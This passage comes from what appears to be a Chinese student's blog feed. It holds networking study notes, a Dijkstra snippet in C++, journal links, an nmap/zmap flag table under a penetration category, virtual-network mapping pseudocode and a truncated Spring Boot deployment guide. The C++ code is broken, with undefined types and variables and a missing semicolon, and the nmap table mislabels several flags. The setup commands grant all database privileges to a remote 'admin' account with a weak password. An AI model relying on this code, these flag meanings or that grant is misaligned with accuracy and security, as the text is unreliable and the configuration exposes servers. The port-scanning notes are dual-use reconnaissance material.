title="自由空间称为“非导引型传输媒体”。"></a>自由空间称为“非导引型传输媒体”。</h3><p><strong>短波通信（即高频通信）</strong>主要是靠【电离层】的反射，但短波信道的通信质量较差，<br>传输速率低微波在空间主要是直线传播</p><p><strong>传统微波</strong>：地面微波接力通信 、卫星通信</p><p><strong>宽带接入技术</strong>：有线宽带接入 无线宽带接入</p><h2 id="非对称数字用户线-ADSL-Asymmetric-Digital-Subscriber-Line-技术"><a href="#非对称数字用户线-ADSL-Asymmetric-Digital-Subscriber-Line-技术" class="headerlink" title="非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术"></a>非对称数字用户线 ADSL (Asymmetric Digital Subscriber Line) 技术</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务</span><br><span class="line">特点：上行和下行带宽做成不对称的(上行指从用户到 ISP，而下行指从 ISP 到用户)。</span><br><span class="line">ADSL 在用户线（铜线）的两端各安装一个ADSL 调制解调器。</span><br><span class="line">我国目前采用的方案是离散多音调 DMT (Discrete Multi-Tone)调制技术。</span><br><span class="line">（这里的“多音调”就是【“多载波”或“多子信道”】的意思。</span><br><span class="line"></span><br><span class="line">DMT 调制技术采用【频分复用】的方法</span><br><span class="line">ADSL 采用【自适应调制技术】使用户线能够传送尽可能高的数据率，但【不能保证固定的数据率】</span><br><span class="line">第二代ADSL【无缝速率自适应技术 SRA (Seamless Rate Adaptation)】HFC网使用【模拟光纤技术】</span><br><span class="line">【电缆调制解调器】是为【 HFC 网】而使用的调制解调器</span><br></pre></td></tr></table></figure><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><h2 id="链路层使用的信道-点对点信道、广播信道"><a href="#链路层使用的信道-点对点信道、广播信道" class="headerlink" title="链路层使用的信道 :点对点信道、广播信道"></a>链路层使用的信道 :点对点信道、广播信道</h2><p><strong>链路&lt;通路</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据（逻辑）链路 (data link) 除了【物理线路】外，还必须有【通信协议】来控制这些数据的传输。</span><br><span class="line">若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。</span><br><span class="line">现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。</span><br><span class="line">一般的适配器都包括了【数据链路层和物理层】这两层的功能。</span><br></pre></td></tr></table></figure><h2 id="数据链路层协议要解决的基本问题"><a href="#数据链路层协议要解决的基本问题" class="headerlink" title="数据链路层协议要解决的基本问题"></a>数据链路层协议要解决的基本问题</h2><p>【封装成帧】【透明传输】【差错控制】</p><p>①<strong>封装成帧</strong>，在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。<br>作用：确定帧的界限【帧定界】。—帧定界符SOH_DATA_EOT（end of transmission）</p><p>②<strong>透明传输</strong>：如果数据中的某个字节的二进制代码恰好和SOH或EOT一样<br>数据链路层就会错误地“找到帧的边界”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">解决方法：【字节填充 (byte stuffing)】或【字符填充(character stuffing)】。</span><br><span class="line">1发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面</span><br><span class="line">插入一个转义字符“ESC”(其十六进制编码是 1B)。</span><br><span class="line">2接收端的数据链路层在将数据送往网络层之前删除插入的转义字符</span><br><span class="line">3如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。</span><br><span class="line">当接收端收到连续的两个转义字符时，就删除其中前面的一个</span><br></pre></td></tr></table></figure><p>③<strong>差错检测</strong>：在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1<br>在一段时间内，传输错误的比特占所传输比特总数的比率称为【误码率 BER (Bit Error Rate)】。</p><h2 id="循环冗余检验CRC"><a href="#循环冗余检验CRC" class="headerlink" title="循环冗余检验CRC"></a>循环冗余检验CRC</h2><p>计算冗余码，余数作为FCS【帧检验序列】</p><ul><li>CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 </li><li>FCS 可以用 CRC 这种方法得出，但 CRC 并不是获得 FCS 的唯一方法</li><li>“无比特差错”与“无传输差错”是不同的概念。</li></ul><p>(1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受 (accept)。</p><p>(2) 若余数 R！=0，则判定这个帧有差错，就丢弃。<br>数据链路层的CRC检验可以实现【无比特差错】，</p><ul><li>但是【不可靠传输】【不能确定是哪个比特出了差错】，只能做到【无差错接受】（无比特差错）<br>要做到“可靠传输”（即发送什么就收到什么）就必须再加上【确认和重传机制】</li></ul><h2 id="PROTOCAL-PPP-Point-to-Point-Protocol-协议】点对点协议（包含了物理层和ip层的内容）"><a href="#PROTOCAL-PPP-Point-to-Point-Protocol-协议】点对点协议（包含了物理层和ip层的内容）" class="headerlink" title="PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容）"></a>PROTOCAL PPP(Point-to-Point Protocol)协议】点对点协议（包含了物理层和ip层的内容）</h2><ul><li>【面向字节，以字节为单位】</li><li>【一个将 IP 数据报封装到串行链路的方法】</li><li>【链路控制协议 LCP (Link Control Protocol)】</li><li>【网络控制协议 NCP (Network Control Protocol)】</li><li>【同步传输时，采用硬件完成【比特填充】，零比特传输：五个连续的1就填入一个0，接收时删除】</li><li>【异步传输时，使用特殊的字符填充法】<br>MAC帧格式<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/mac.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><h2 id="PROTOCAL-CSMA-CD"><a href="#PROTOCAL-CSMA-CD" class="headerlink" title="PROTOCAL CSMA/CD"></a>PROTOCAL CSMA/CD</h2><p>局域网具有如下主要优点：</p><ul><li>【具有广播功能】，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。</li><li>【便于系统的扩展和逐渐地演变】，各设备的位置可灵活调整和改变。</li><li>【提高了系统的可靠性、可用性、残存性】</li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dijstra</title>
      <link href="/2018/12/11/2018-12-11-dijstra/"/>
      <url>/2018/12/11/2018-12-11-dijstra/</url>
      
        <content type="html"><![CDATA[<p>求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了<del>已经忘了</del></p><a id="more"></a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Link</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> from,to,dist;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> d,u;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> HeapNode &amp; a) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> d &gt; a.d;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SubstrateNetwork</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> nodes;</span><br><span class="line"><span class="keyword">int</span> links</span><br><span class="line"><span class="built_in">vector</span>&lt;Link&gt; maplinks;</span><br><span class="line"><span class="keyword">bool</span> isvisited[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; G[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;n = n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)G[i].clear();</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span> vis);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)p[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++)d[i] = INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">priority_queue&lt;Node&gt; q;</span><br><span class="line">q.push(Node&#123;<span class="number">0</span>,s&#125;);</span><br><span class="line">distance[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">Node temp = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> u = temp.u;</span><br><span class="line"><span class="keyword">if</span>(isvisited[u])</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">isvisited[u]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G[u].size();i++)&#123;</span><br><span class="line">Link e = maplinks[G[u][i]];</span><br><span class="line"><span class="keyword">if</span>(distance[e.to] &gt; distance[u] + e.dist)&#123;</span><br><span class="line">distance[e.to] = distance[u] + e.dist;</span><br><span class="line">p[e.to] = u;</span><br><span class="line">q.push(HeapNode&#123;distance[e.to],e.to&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些网页链接</title>
      <link href="/2018/12/08/2018-12-08-%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5/"/>
      <url>/2018/12/08/2018-12-08-%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>网络原理相关期刊</p><a id="more"></a><h1 id="顶级期刊"><a href="#顶级期刊" class="headerlink" title="顶级期刊"></a>顶级期刊</h1><h2 id="名称：ieee-network"><a href="#名称：ieee-network" class="headerlink" title="名称：ieee network"></a>名称：ieee network</h2><h2 id="主页网址："><a href="#主页网址：" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=65" target="_blank" rel="noopener">ieee network</a></p><h2 id="名称：journal-of-network-and-computer-applications"><a href="#名称：journal-of-network-and-computer-applications" class="headerlink" title="名称：journal of network and computer applications"></a>名称：journal of network and computer applications</h2><h2 id="主页网址：-1"><a href="#主页网址：-1" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/10848045" target="_blank" rel="noopener">journal of network and computer applications</a></p><h2 id="名称：ieee-acm-transactions-on-networking"><a href="#名称：ieee-acm-transactions-on-networking" class="headerlink" title="名称：ieee-acm transactions on networking"></a>名称：ieee-acm transactions on networking</h2><h2 id="主页网址：-2"><a href="#主页网址：-2" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=90" target="_blank" rel="noopener">ieee-acm transactions on networking</a></p><h2 id="名称：Ad-Hoc-Networks"><a href="#名称：Ad-Hoc-Networks" class="headerlink" title="名称：Ad Hoc Networks"></a>名称：Ad Hoc Networks</h2><h2 id="主页网址：-3"><a href="#主页网址：-3" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/15708705" target="_blank" rel="noopener">Ad Hoc Networks</a></p><h2 id="名称：cluster-computing-the-journal-of-networks-software-tools-and-applications"><a href="#名称：cluster-computing-the-journal-of-networks-software-tools-and-applications" class="headerlink" title="名称：cluster computing-the journal of networks software tools and applications"></a>名称：cluster computing-the journal of networks software tools and applications</h2><h2 id="主页网址：-4"><a href="#主页网址：-4" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/10586" target="_blank" rel="noopener">cluster computing-the journal of networks software tools and applications</a></p><h2 id="名称：Computer-Networks"><a href="#名称：Computer-Networks" class="headerlink" title="名称：Computer Networks"></a>名称：Computer Networks</h2><h2 id="主页网址：-5"><a href="#主页网址：-5" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/13891286" target="_blank" rel="noopener">Computer Networks</a></p><h2 id="名称：Optical-Switching-and-Networking"><a href="#名称：Optical-Switching-and-Networking" class="headerlink" title="名称：Optical Switching and Networking"></a>名称：Optical Switching and Networking</h2><h2 id="主页网址：-6"><a href="#主页网址：-6" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sciencedirect.com/science/journal/15734277" target="_blank" rel="noopener">Optical Switching and Networking</a></p><h2 id="名称：Mobile-Networks-and-Applications"><a href="#名称：Mobile-Networks-and-Applications" class="headerlink" title="名称：Mobile Networks and Applications"></a>名称：Mobile Networks and Applications</h2><h2 id="主页网址：-7"><a href="#主页网址：-7" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/11036" target="_blank" rel="noopener">Mobile Networks and Applications</a></p><h2 id="名称：Wireless-Networks"><a href="#名称：Wireless-Networks" class="headerlink" title="名称：Wireless Networks"></a>名称：Wireless Networks</h2><h2 id="主页网址：-8"><a href="#主页网址：-8" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/11276" target="_blank" rel="noopener">Wireless Networks</a></p><h2 id="名称：Networks"><a href="#名称：Networks" class="headerlink" title="名称：Networks"></a>名称：Networks</h2><h2 id="主页网址：-9"><a href="#主页网址：-9" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://onlinelibrary.wiley.com/journal/" target="_blank" rel="noopener">Networks</a></p><h2 id="名称：Journal-of-Network-and-Systems-Management"><a href="#名称：Journal-of-Network-and-Systems-Management" class="headerlink" title="名称：Journal of Network and Systems Management"></a>名称：Journal of Network and Systems Management</h2><h2 id="主页网址：-10"><a href="#主页网址：-10" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://link.springer.com/journal/10922" target="_blank" rel="noopener">Journal of Network and Systems Management</a></p><h1 id="顶级会议："><a href="#顶级会议：" class="headerlink" title="顶级会议："></a>顶级会议：</h1><h2 id="名称：acm-sigcomm"><a href="#名称：acm-sigcomm" class="headerlink" title="名称：acm sigcomm"></a>名称：acm sigcomm</h2><h2 id="主页网址：-11"><a href="#主页网址：-11" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://www.sigcomm.org/" target="_blank" rel="noopener">acm sigcomm</a></p><h2 id="名称-ieee-infocom"><a href="#名称-ieee-infocom" class="headerlink" title="名称: ieee infocom"></a>名称: ieee infocom</h2><h2 id="主页网址：-12"><a href="#主页网址：-12" class="headerlink" title="主页网址："></a>主页网址：</h2><p><a href="http://infocom2017.ieee-infocom.org/" target="_blank" rel="noopener">ieee infocom</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap zmap使用</title>
      <link href="/2018/12/01/2018-12-01-nmap&amp;zmap/"/>
      <url>/2018/12/01/2018-12-01-nmap&amp;zmap/</url>
      
        <content type="html"><![CDATA[<p>nmap 和 zmap的参数表，端口嗅探</p><a id="more"></a><hr><h2 id="参数表"><a href="#参数表" class="headerlink" title="参数表"></a>参数表</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nmap_param.png" alt title>                </div>                <div class="image-caption"></div>            </figure><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sL</td><td align="center">TCP SYN</td></tr><tr><td align="center">-sT</td><td align="center">Connect</td></tr><tr><td align="center">-sA</td><td align="center">ACK</td></tr><tr><td align="center">-sW</td><td align="center">Window</td></tr><tr><td align="center">-sM</td><td align="center">Maimon scans</td></tr><tr><td align="center">-sU</td><td align="center">UDP scan</td></tr><tr><td align="center">-sN</td><td align="center">TCP NULL</td></tr><tr><td align="center">-sF</td><td align="center">FIN</td></tr><tr><td align="center">-sX</td><td align="center">Xmax scans</td></tr><tr><td align="center">-sI host:probeport]</td><td align="center">zombie host scan</td></tr><tr><td align="center">-sY</td><td align="center">SCTP INIT</td></tr><tr><td align="center">-sZ</td><td align="center">Cookie-echo scans</td></tr><tr><td align="center">-sO</td><td align="center">IP protocol scan</td></tr><tr><td align="center">-b FTPserver</td><td align="center">FTP bounce scan</td></tr></tbody></table><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nmaphostscan.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>参照的详解文章<br>[<a href="https://www.cnblogs.com/nmap/p/6232969.html]" target="_blank" rel="noopener">https://www.cnblogs.com/nmap/p/6232969.html]</a></li></ul><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-sL</td><td align="center">TCP SYN</td></tr><tr><td align="center">-sn</td><td align="center">Ping Scan - disable port scan（测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）</td></tr><tr><td align="center">-sS</td><td align="center">发送SYN包到远程主机，但不会产生任何会话，目标主机不会把连接记入系统日志。（为了防止对方判断为扫描攻击，目前挺多加防服务器直接会把扫自己端口的的ip拉黑）</td></tr><tr><td align="center">-sA</td><td align="center">Connect，探测主机是否开机</td></tr><tr><td align="center">-PE</td><td align="center">Connect</td></tr><tr><td align="center">-PS80</td><td align="center">ACK</td></tr><tr><td align="center">-PR</td><td align="center">Window</td></tr><tr><td align="center">-Pn</td><td align="center">无ping扫描</td></tr><tr><td align="center">-sP</td><td align="center">快速ping，扫描本地局域网有那些机器，或者直接可以用前缀式表示类似于x.x.x.0/24</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sniffer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>映射过程描述</title>
      <link href="/2018/12/01/2018-12-01-%E6%98%A0%E5%B0%84%E8%BF%87%E7%A8%8B%E6%8F%8F%E8%BF%B0/"/>
      <url>/2018/12/01/2018-12-01-%E6%98%A0%E5%B0%84%E8%BF%87%E7%A8%8B%E6%8F%8F%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p>虚拟网络映射算法的节点、链路映射一般过程</p><a id="more"></a><h1 id="映射过程"><a href="#映射过程" class="headerlink" title="映射过程"></a>映射过程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(request:requestList)&#123;</span><br><span class="line">映射成功标记 flag</span><br><span class="line">① flag = 节点映射结果</span><br><span class="line"><span class="keyword">if</span>(falg)  节点资源分配 执行②部分</span><br><span class="line"><span class="keyword">else</span> 本组request映射失败</span><br><span class="line">② flag = 链路映射结果</span><br><span class="line"><span class="keyword">if</span>(falg)  链路资源分配</span><br><span class="line"><span class="keyword">else</span> 本组request映射失败</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="节点映射过程"><a href="#节点映射过程" class="headerlink" title="节点映射过程"></a>节点映射过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">排序物理网络、网络请求的节点;<span class="comment">//每一次按改进的H值（加入负载均衡系数后）对物理网络进行排序</span></span><br><span class="line"><span class="keyword">for</span>( vn_node : vn_nodes)&#123;<span class="comment">//对每一个排序后的虚拟节点</span></span><br><span class="line"><span class="keyword">for</span>(遍历物理节点)&#123;</span><br><span class="line"><span class="keyword">if</span>(物理节点节点剩余CPU &gt; 虚拟节点CPU需求)&#123;</span><br><span class="line">存储映射结果，跳出<span class="keyword">for</span>循环，映射下一个节点</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(物理节点遍历结束)&#123;</span><br><span class="line">映射失败,返回<span class="keyword">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">节点映射成功，分配物理节点资源</span><br></pre></td></tr></table></figure><h2 id="链路映射过程"><a href="#链路映射过程" class="headerlink" title="链路映射过程"></a>链路映射过程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span>(vn_link :vn_links)&#123;<span class="comment">//对每一个request的链路请求</span></span><br><span class="line">       取出链路需求带宽，起、止节点id</span><br><span class="line">       根据起止节点id(from,to)查找最短路径 floyd</span><br><span class="line">       <span class="keyword">if</span>(finded)&#123;</span><br><span class="line"> <span class="comment">//找到链路后验证带宽</span></span><br><span class="line"><span class="keyword">if</span>(链路需求带宽 &gt; 物理链路剩余带宽)  映射失败;</span><br><span class="line"> <span class="keyword">else</span> 将这一条链路加入resultLinks（链路映射最终结果）</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//链路不通，映射失败</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot+modleView+rmi调用自己写的天气预报的新闻系统</title>
      <link href="/2018/11/30/2018-11-30-newsSystem/"/>
      <url>/2018/11/30/2018-11-30-newsSystem/</url>
      
        <content type="html"><![CDATA[<p>一个springboot(collect springmvc、hibernate、modleView）+rmi远程调用天气预报系统的小项目</p><a id="more"></a><h1 id="newsSystem"><a href="#newsSystem" class="headerlink" title="newsSystem"></a>newsSystem</h1><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fgo1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><blockquote><p>先放上作业的代码地址</p></blockquote><h2 id="新闻系统"><a href="#新闻系统" class="headerlink" title="新闻系统"></a>新闻系统</h2><ul><li><a href="https://github.com/waynamigo/newsSystem" target="_blank" rel="noopener">newsSystem</a></li></ul><h2 id="下面是在centos服务器上部署环境，建一个新数据库用户进行管理"><a href="#下面是在centos服务器上部署环境，建一个新数据库用户进行管理" class="headerlink" title="下面是在centos服务器上部署环境，建一个新数据库用户进行管理"></a>下面是在centos服务器上部署环境，建一个新数据库用户进行管理</h2><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install mysql mysql-server mysql-devel</span><br><span class="line">create user newsadmin;</span><br><span class="line">create database newsbase;</span><br><span class="line">grant all privileges on newsbase.* to newsadmin@localhost identified by<span class="string">'password'</span>;</span><br><span class="line">revoke all on *.* from <span class="string">'admin'</span>@<span class="string">'%'</span>;</span><br><span class="line">grant all on *.* to <span class="string">'admin'</span>@<span class="string">'%'</span> identified by <span class="string">'wdnm'</span></span><br></pre></td></tr></table></figure><ul><li>数据库用户名，密码在application.yml文件中配置</li></ul><h2 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk-devel</span><br><span class="line">安装maven到usr/<span class="built_in">local</span>/apache-maven</span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/usr/<span class="built_in">local</span>/apache-maven</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;MAVEN_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">服务器端Could not find or load main class org.apache.maven.wrapper.MavenWrapperMain</span><br><span class="line">错误解决：mvn io.takari:maven:wrapper</span><br></pre></td></tr></table></figure><ul><li>环境变量别写错<h2 id="mysql服务没启动的错误，很奇妙"><a href="#mysql服务没启动的错误，很奇妙" class="headerlink" title="mysql服务没启动的错误，很奇妙"></a>mysql服务没启动的错误，很奇妙</h2></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.d/init.d/mysqld status </span><br><span class="line"></span><br><span class="line">/etc/init.d/mysqld start</span><br></pre></td></tr></table></figure><h2 id="创建项目文件夹"><a href="#创建项目文件夹" class="headerlink" title="创建项目文件夹"></a>创建项目文件夹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /classdesign</span><br><span class="line">chmod 754 /classdesign</span><br></pre></td></tr></table></figure><h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar newsSystem.jar &gt; springbootinfo.out 2&gt;&amp;1  &amp;</span><br><span class="line">或</span><br><span class="line">nohup ./mvnw spring-boot:run &gt; springbootinfo.out 2&gt;&amp;1  &amp;</span><br></pre></td></tr></table></figure><hr><h2 id="代码高亮测试"><a href="#代码高亮测试" class="headerlink" title="代码高亮测试"></a>代码高亮测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Controller</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserService userService=<span class="keyword">new</span> UserService();</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    NewsService newsService=<span class="keyword">new</span> NewsService();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> 